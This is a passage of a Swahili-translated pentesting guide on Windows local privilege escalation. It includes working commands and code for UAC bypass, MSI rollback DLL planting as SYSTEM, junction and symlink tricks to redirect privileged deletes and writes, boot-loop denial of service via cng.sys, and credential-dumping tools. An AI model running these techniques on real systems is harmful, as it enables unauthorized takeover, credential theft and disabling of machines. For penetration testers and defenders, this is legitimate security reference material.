telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya Faili vinavyoweza kutekeleza vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Viungo vya Markdown vinavyoweza kubofya vikipelekwa kwa `ShellExecuteExW` vinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili kupata passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au processes nyingine zinazotekelezwa ambazo **huweka credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kuonyesha tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji mwenye haki za chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii inaruhusu kupandisha haki na kukwepa UAC kwa wakati mmoja kupitia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imetiwa sahihi na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni lazima kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na maelezo yote yanayohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kupakia Directory Junctions kwenye Root Inayohudumiwa

Programu inaweza kuunda subdirectory ya upload yenye jina linalotabirika, kuandika ndani yake faili yenye jina lililotolewa na caller, kisha kuichakata faili hiyo. Ikiwa mtumiaji mwenye privilege ndogo anaweza kuondoa subdirectory hiyo na kuibadilisha na NTFS junction kabla ya write ya upande wa server, write hiyo inaweza kufuata junction hadi kwenye directory inayohudumiwa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa server inaendesha aina hiyo ya faili. Huu ni mpaka wa arbitrary-write unaotegemea programu husika; kuwa na directory ya upload inayoweza kuandikwa au junction iliyopo pekee hakuthibitishi hili.

Kagua jinsi path inavyoundwa hasa na muda wa tukio hilo katika upload handler, haki za mtumiaji za delete/create zinazotumika kwenye subdirectory, ACL zinazotumika kwenye destination, kama writer hufuata reparse points, na kama web server huendesha faili katika destination hiyo. Thibitisha utambulisho wa process za writer na web server kando. Passive inventory inaweza kuonyesha ACL za directory na metadata ya reparse, lakini haiwezi kuthibitisha tabia ya handler au kubadilishwa kwa junction siku zijazo. Ikiwa execution itafanyika kwa service account, kagua **token halisi ya process** kabla ya kuzingatia njia tofauti ya token-privilege.

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili kimsingi linahusisha kutumia rollback feature ya Windows Installer ili kubadilisha faili halali na zenye madhara wakati wa mchakato wa uninstallation. Ili kufanya hivyo, mshambuliaji anahitaji kuunda **MSI installer yenye madhara** itakayotumika kuteka nyara folder ya `C:\Config.Msi`. Baadaye, Windows Installer itatumia folder hiyo kuhifadhi rollback files wakati wa kuondoa MSI packages nyingine; rollback files hizo zitakuwa zimebadilishwa ili ziwe na malicious payload.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Client mwenye privilege ndogo anaweza kufikia service ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibainisha kuwa miito husika ya `IMsiServer` ni `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimepatikana kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye administrator, `SetEEUIDirectoryAndFilter` hujifanya caller kwa muda tu inapofungua path iliyotolewa kwa kutumia `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kwamba caller anaweza kufuta directory na huzuia kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na cleanup ya baadaye wala kuthibitisha kuwa Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` huratibu path hiyo kama folder bila kujali filter argument ya caller. Service huandika value yenye jina lililotajwa la `REG_DWORD` chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la value ni path inayodhibitiwa na caller na data `0x00000002` ni folder flag. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye cleanup. Worker wake iliyoinuliwa huorodhesha registry values na kupitisha entries za folder kwa `FDeleteFolder` ya recursive bila kukagua chanzo cha path. Ikiwa uondoaji wa kawaida hautafaulu, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive inayofaa ni kutumia tena njia, si kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena jina hilo la njia kwa data ya rollback iliyolindwa. Usafishaji huamini jina la zamani la `TempPackages` na hufuta directory mpya kama SYSTEM. Hii inakwepa mpaka uliokusudiwa na `FILE_FLAG_OPEN_REPARSE_POINT` na mitigation ya kuamini redirection kwa sababu reparse point haihitajiki.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika mnyororo wa rollback hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle uliyopewa `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL ruhusu kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha njia hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` wakati feature gate mpya imewezeshwa. COM call bado inaweza kurudisha mafanikio, lakini haiweki tena njia inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha Windows security updates za Aprili 2025 badala ya kutumia mafanikio ya kurudi kwa method kama kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama kwa installer kuwa **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Kuondoa
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa kuondoa huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Poll handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kutambua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara faili ya `.rbf` inapoandikwa.
        - Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huizuia kufutwa**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer inashindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Katika hatua hii, **anzisha udhaifu wa kufuta folder kiholela kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Upya `C:\Config.Msi` kwa ACL dhaifu
    - Unda upya folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle ikiwa wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya kulazimishwa.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itokee.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa event faili ya `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea event ya `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` script bandia ya rollback inayoiambia Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye mamlaka ya juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **DLL payload hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya sync ili installer iendelee.
    - **Custom action ya aina ya 19 (`ErrorOut`)** imewekwa **kushindwa kwa makusudi** kwa usakinishaji katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Inasakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` hadi mahali lengwa.
    - Sasa una **DLL yako hasidi kwenye njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **binary inayoaminika inayoinuliwa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka.
    - **Basi**: code yako inatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina kwa Faili Kiholela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotajwa hapo awali) inadhania kuwa unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu **kufuta faili kiholela** pekee?

Unaweza kutumia **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Je, ikiwa primitive yako haikuruhusu kufuta file/folder zozote, lakini **inakuruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** mchakato wenye upendeleo unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Ukifika kwenye `file1.txt`, **oplock huwashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii humwaga yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kinachofutwa kwa kweli ni:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda Yoyote Hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida hulingana na kiendeshi cha kernel-mode `cng.sys`.
- Ukiunda **folda kwenye njia hiyo mapema**, Windows hushindwa kupakia kiendeshi halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Hukuta folda, **hushindwa kutambua kiendeshi halisi**, na **huanguka au husitisha kuwasha**.
- Hakuna **fallback**, wala **njia ya kurejesha mfumo** bila uingiliaji wa nje (k.m. ukarabati wa kuwasha au ufikiaji wa diski).

### Kutoka kwenye njia za log/backup zenye haki za juu + OM symlinks hadi kubadilisha faili yoyote / DoS ya kuwasha

Wakati **huduma yenye haki za juu** huandika logi/usafirishaji kwenye njia iliyosomwa kutoka kwenye **usanidi unaoweza kuandikwa**, elekeza njia hiyo upya kwa **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wenye haki za juu kuwa ubadilishaji wowote wa faili (hata **bila** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Faili ya usanidi inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (k.m. `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point hadi `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye haki za juu inayoandika kwenye njia hiyo (logi, usafirishaji, ripoti).

**Mlolongo wa mfano**
1. Soma usanidi ili kupata njia ya logi yenye haki za juu, k.m. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza njia upya bila haki za admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri sehemu yenye ruhusa za juu iandike logi (kwa mfano, msimamizi achochee kitendo cha “tuma SMS ya majaribio”). Sasa maandishi yataandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua faili lengwa lililoandikwa juu yake (kwa hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia njia ya driver iliyobadilishwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo huduma yenye ruhusa za juu itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa mahali pa kuaminika pa kusababisha DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze huduma mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapounda service binary, hakikisha ni service halali au binary hiyo inatekeleza vitendo vinavyohitajika haraka, kwani itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege hadi System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi privileges kamili za Token

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato ambao tayari una High Integrity), utaweza **kufungua karibu process yoyote** (sio process zilizolindwa) kwa kutumia privilege ya SeDebug, **kunakili token** ya process hiyo, na kuunda **process yoyote ukitumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kufanya escalation kupitia `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/ kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service), na kupata privileges za SYSTEM.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hili**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka High Integrity hadi System kwa kutumia name pipes, soma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayokuwa **loaded** na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa kutumia ruhusa hizo. Kwa hiyo, Dll Hijacking pia inafaa kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kuitekeleza kutoka kwenye process ya High Integrity**, kwa kuwa process hiyo itakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi privileges kamili

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na mafaili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya maelezo (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwa mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hufanya password spraying kwa domain kwa kutumia passwords zilizokusanywa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Zana ya msingi ya Windows enumeration kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji ku-compile kwa kutumia VisualStudio) ([**iliyocompiliwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host kutafuta misconfigurations (ni zana zaidi ya kukusanya maelezo kuliko privesc) (inahitaji ku-compile) **(**[**iliyocompiliwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompiliwa mapema inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp lililoandikwa kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa mapema inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa msingi wa chapisho hili (haihitaji accesschk ili kufanya kazi ipasavyo, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji ku-compile project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kupandisha privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - dokezo la marejeo](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo nyeusi mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa hadaa kupitia SMTP kwa macro ya Word VBA → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak ya format-string + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya Mfumo wa Faili yenye Privileges Iliyopo kwenye Mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
